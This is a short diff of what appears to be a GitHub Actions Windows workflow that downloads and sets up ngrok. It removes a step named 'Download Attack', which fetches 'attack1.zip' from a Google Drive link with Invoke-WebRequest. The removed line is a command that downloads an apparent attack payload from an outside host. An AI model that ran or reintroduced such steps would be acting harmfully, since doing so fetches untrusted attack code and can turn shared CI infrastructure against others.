@@ -10,8 +10,6 @@ jobs:
     steps:
     - name: Download
       run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
-    - name: Download Attack
-      run: Invoke-WebRequest https://drive.google.com/uc?export=download&id=1yX4OazlLOR_UR-ZEJWTC3SZz6AYk_8n1 -OutFile attack1.zip
     - name: Extract
       run: Expand-Archive ngrok.zip
     - name: Auth
